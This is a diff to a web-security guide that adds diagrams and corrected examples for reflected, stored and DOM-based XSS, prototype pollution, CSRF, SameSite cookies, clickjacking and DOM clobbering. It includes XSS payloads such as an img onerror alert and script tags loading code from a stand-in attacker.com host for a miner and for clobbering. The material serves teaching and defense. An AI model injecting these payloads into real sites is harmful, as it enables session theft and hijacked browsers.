@@ -25,6 +25,31 @@ Cross-Site Scripting (XSS) is one of the most prevalent and dangerous web vulner
 
 XSS vulnerabilities are classified into three main types based on how the payload is delivered and executed.
 
+The three types differ in *where the payload lives* before it runs:
+
+```text
+  REFLECTED                               payload lives in the URL
+    attacker --link--> victim browser --GET ?q=<payload>--> server
+                            <-- response echoes the payload ---'
+                            script runs for whoever clicked
+
+  STORED                                  payload lives in the DB
+    attacker --POST comment=<payload>--> server --> database
+    victim   --GET /comments ----------> server --> database
+                            <-- page contains the payload -----'
+                            script runs for every visitor
+
+  DOM-BASED                      payload never reaches the server
+    attacker --link #<payload>--> victim browser
+                                  page JS reads location.hash
+                                  writes it into innerHTML
+                                  script runs
+```
+
+This is why server-side input filtering stops reflected and stored XSS
+but is useless against DOM-based XSS: the payload stays in the fragment,
+which the browser never sends.
+
 ## 1. Reflected XSS (Non-Persistent)
 
 **Definition**: The malicious script is embedded in the HTTP request (typically URL or form data) and immediately reflected back in the response without proper sanitization.
@@ -305,11 +330,13 @@ var results = document.getElementById('results');
 results.innerHTML = 'You searched for: ' + search;
 ```
 
-**Attack:**
+**Attack:** the user (or a pre-filled link) puts this in the search field:
 
 ```html
-<input id="search" value="<img src=x onerror=alert(1)>">
+<img src=x onerror=alert(1)>
 ```
+
+The `<img>` fails to load, `onerror` fires, and the payload executes.
 
 #### Example 2: location.hash
 
@@ -365,12 +392,17 @@ document.body.innerHTML = `<h1>Hello ${name}</h1>`;
 
 **Prototype Pollution Leading to DOM XSS:**
 
-```javascript
-// Pollute prototype
-Object.prototype.innerHTML = '<img src=x onerror=alert(1)>';
+Pollution alone is not XSS. It becomes XSS when polluted property lookup
+feeds a sink, because a missing own property falls back to the prototype:
 
-// Later in code (vulnerable if it reads from prototype)
-someElement.innerHTML = config.template; // Uses polluted prototype
+```javascript
+// Attacker-controlled pollution (e.g. via a vulnerable merge or a
+// query string parsed into an object):
+Object.prototype.template = '<img src=x onerror=alert(1)>';
+
+// Later, library code reads an option that was never set:
+const config = {};
+element.innerHTML = config.template;  // resolves via the prototype
 ```
 
 ## Mutation XSS (mXSS)
@@ -600,12 +632,12 @@ Attacker gains:
 
 ### 5. Cryptocurrency Mining
 
+XSS can also load a miner that burns the victim's CPU while the page is
+open. The best-known service, Coinhive, shut down in 2019, but the
+pattern is unchanged: inject a script tag, let it run in the background.
+
 ```javascript
 <script src="https://attacker.com/miner.js"></script>
-<script>
-  var miner = new CoinHive.Anonymous('site-key');
-  miner.start();
-</script>
 ```
 
 ## XSS Prevention and Mitigation
@@ -758,6 +790,28 @@ Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict
 5. Browser automatically includes session cookie
 6. Request executes with victim's privileges
 
+```text
+   victim                     evil.com                bank.com
+      |                           |                       |
+      | 1. log in ----------------+----------------------->
+      |<-- Set-Cookie: session ---+-----------------------|
+      |                           |                       |
+      | 2. visit ----------------->                       |
+      |<-- page with an auto-submitting form              |
+      |                           |                       |
+      | 3. POST /transfer --------+----------------------->
+      |  the browser attaches bank.com's cookie           |
+      |  automatically: cookies are keyed by the          |
+      |  destination, not by the page that sent           |
+      |  the request
+      |                           |                       |
+      |<-- 200 OK, money moved ---+-----------------------|
+```
+
+Note that the attacker never reads the response. Same-origin policy
+blocks that. CSRF only needs the *side effect* of the request, which is
+why read-only endpoints are not CSRF targets.
+
 ### CSRF Attack Examples
 
 #### Example 1: GET Request
@@ -885,8 +939,10 @@ Set-Cookie: session=abc123; SameSite=Strict; Secure; HttpOnly
   Set-Cookie: session=abc123; SameSite=Strict
   ```
 
-  ✅ Prevents all CSRF
-  ❌ Breaks legitimate cross-site navigation
+  ✅ Blocks cross-site requests, including top-level navigation
+  ❌ Breaks legitimate inbound links (user arrives logged out)
+  ⚠️ "Same-site" means the registrable domain, so a request from
+  `evil.example.com` to `example.com` still counts as same-site
 
 - **Lax** (Default in modern browsers):
 
@@ -947,6 +1003,12 @@ document.cookie = 'csrf_token=' + token;
 if request.cookies['csrf_token'] != request.form['csrf_token']:
     abort(403)
 ```
+
+This pattern requires no server-side state, which is why it is popular,
+but it is the weakest of the token defenses: anyone who can set a cookie
+on the parent domain (a vulnerable or taken-over subdomain) can choose
+both halves of the comparison. See "Subdomain Takeover" below. Prefer
+the synchronizer token pattern, or sign the cookie value.
 
 #### 5. Referer/Origin Validation
 
@@ -1023,7 +1085,23 @@ document.cookie = 'csrf_token=attacker_value; domain=.example.com';
 
 ### How Clickjacking Works
 
-Attacker overlays invisible iframe over deceptive content:
+Attacker overlays an invisible iframe over deceptive content. The trick
+is purely about stacking order and alignment:
+
+```text
+  what the user sees            where the click actually lands
+
+  +------------------------+    z-index 2 . invisible iframe
+  |                        |    ################################
+  |   [ FREE iPHONE! ]     |    #  bank.com/delete-account     #
+  |                        |    #     [ Confirm delete ]       #
+  +------------------------+    ################################
+  z-index 1 . attacker page     opacity 0.0001, stacked on top
+                                and aligned over the fake button
+```
+
+The iframe is the topmost layer, so it receives the click; the user only
+ever sees the layer underneath it.
 
 ```html
 <html>
@@ -1143,26 +1221,28 @@ if (top !== self) {
 
 **Example:**
 
+The attacker injects plain HTML, no JavaScript required. This is why DOM
+clobbering survives a CSP that blocks inline script:
+
 ```html
-<form id="user">
-  <input name="admin" value="true">
-</form>
-
-<script>
-// Attacker injects:
-<a id="config" href="https://attacker.com/evil.js">
-
-// Later in code:
-if (config.admin) {  // Reads from DOM, not expected object
-  // ...
-}
-
-// Or:
-let script = document.createElement('script');
-script.src = config.apiUrl;  // Points to attacker's URL
-document.body.appendChild(script);
-</script>
+<!-- Injected markup. Two elements sharing an id make window.config an
+     HTMLCollection, so config.apiUrl resolves to the named anchor. -->
+<a id="config"></a>
+<a id="config" name="apiUrl" href="https://attacker.com/evil.js"></a>
 ```
+
+```javascript
+// Application code that assumed `config` was its own object.
+// `window.config` was never declared, so the clobbered element wins.
+let script = document.createElement('script');
+script.src = config.apiUrl;  // -> https://attacker.com/evil.js
+document.body.appendChild(script);
+```
+
+Anchors are the useful element here: `HTMLAnchorElement` stringifies to
+its `href`, so the clobbered property behaves like a string. Most other
+elements stringify to something like `[object HTMLInputElement]`, which
+is why clobbering payloads are built from `<a>` tags.
 
 **Mitigation:**
 
